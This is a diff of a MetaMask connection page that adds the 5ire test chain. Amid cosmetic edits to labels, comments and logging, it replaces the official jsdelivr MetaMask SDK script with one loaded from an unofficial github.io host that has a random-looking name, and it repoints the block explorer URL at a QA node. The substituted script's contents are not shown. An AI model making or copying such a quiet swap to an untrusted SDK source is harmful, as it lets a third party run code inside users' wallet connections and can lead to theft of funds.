@@ -27,14 +27,13 @@
   <h1>MetaMask Integration</h1>
   <div id="status">Status: Not Connected</div>
   <button onclick="connect()">Connect</button>
-  <button onclick="addChain()">Add Chain</button>
+  <button onclick="addChain()">Add Ethereum Chain</button>
 
-  <script src="https://cdn.jsdelivr.net/npm/@metamask/sdk@latest/dist/metamask-sdk.min.js"></script>
+  <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
   <script>
-    // Initialize MetaMask SDK
-    const sdk = new MetaMaskSDK({
+    const sdk = new MetaMaskSDK.MetaMaskSDK({
       dappMetadata: {
-        name: "MetaMask Connectivity",
+        name: "METAMASK CONNECTIVITY",
         url: window.location.host,
       },
       logging: {
@@ -45,81 +44,80 @@
     let provider;
     const defaultChainId = '0x3E5'; // Default chain ID
 const defaultRpcUrl = 'https://rpc-testnet.5ire.network'; // Default RPC URL
-const defaultBlockExplorerUrls = 'https://explorer.5ire.network';
+const defaultBlockExplorerUrls = 'https://qa-http-nodes.5ire.network/';
 const defaultCurrentSymbol = '5ire';
 const defaultChainName = '5ireChain';
 
     var accounts;
 
-    // Connect with MetaMask
+    //<---------CONNECT WITH METAMASK----------------------->
     async function connect() {
       try {
         const res = await sdk.connect();
         provider = sdk.getProvider();
-        console.log('Connected', res);
-        updateStatus('Connected');
+        console.log('request data', res);
+        updateStatus(res);
 
         accounts = res;
 
         // Check and switch to default chain
         const currentChainId = await provider.request({ method: 'eth_chainId' });
-        console.log(`Current Chain ID: ${currentChainId}`);
         if (currentChainId !== defaultChainId) {
           await switchToDefaultChain();
         }
       } catch (e) {
-        console.error('Connection Error', e);
-        updateStatus(`Connection Failed: ${e.message}`);
+        console.log('request accounts ERR', e);
+        updateStatus('Connection Failed');
       }
     }
 
-    // Update status on the page
     function updateStatus(text) {
       document.getElementById('status').innerText = `Status: ${text}`;
     }
 
-    // Switch to the default chain
+    // <---------------------Switch to default chain------------------>
     async function switchToDefaultChain() {
       try {
         await provider.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: defaultChainId }],
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: defaultChainId }],
         });
         updateStatus('Switched to Default Chain');
       } catch (switchError) {
-        console.error('Switch Chain Error', switchError);
+        // This error code indicates that the chain has not been added to MetaMask
         if (switchError.code === 4902) {
-          // Chain not added, try to add it
-          await addChain();
+            // Add the default chain if it's not available in MetaMask
+            await addChain();
         } else {
-          updateStatus(`Switch Chain Failed: ${switchError.message}`);
+            console.log('SWITCH ERR', switchError);
+            updateStatus('Switch Chain Failed');
         }
       }
     }
 
-    // Add the default chain
+    // <-----------------------ADD CHAIN------------------>
     async function addChain() {
       try {
         await provider.request({
-          method: 'wallet_addEthereumChain',
-          params: [
-            {
-              chainId: defaultChainId,
-              chainName: defaultChainName,
-              blockExplorerUrls: [defaultBlockExplorerUrls],
-              nativeCurrency: {
-                name: defaultCurrentSymbol,
-                symbol: defaultCurrentSymbol,
-                decimals: 18,
-              },
-              rpcUrls: [defaultRpcUrl],
-            },
-          ],
+            method: 'wallet_addEthereumChain',
+            params: [
+        {
+          chainId: defaultChainId,
+          chainName: defaultChainName,
+          blockExplorerUrls: [defaultBlockExplorerUrls],
+          nativeCurrency: { 
+            name: '5ire', // Name of the currency
+            symbol: '5ire',     // Symbol of the currency (uppercase to avoid confusion)
+            decimals: 18        // Number of decimals
+          },
+          rpcUrls: [defaultRpcUrl],
+        },
+      ],
         });
         updateStatus('Chain Added');
       } catch (e) {
-        console.error('Add Chain Error', e);
-        updateStatus(`Add Chain Failed: ${e.message}`);
+        console.log('ADD ERR', e);
+        updateStatus('Add Chain Failed');
       }
     }
   </script>
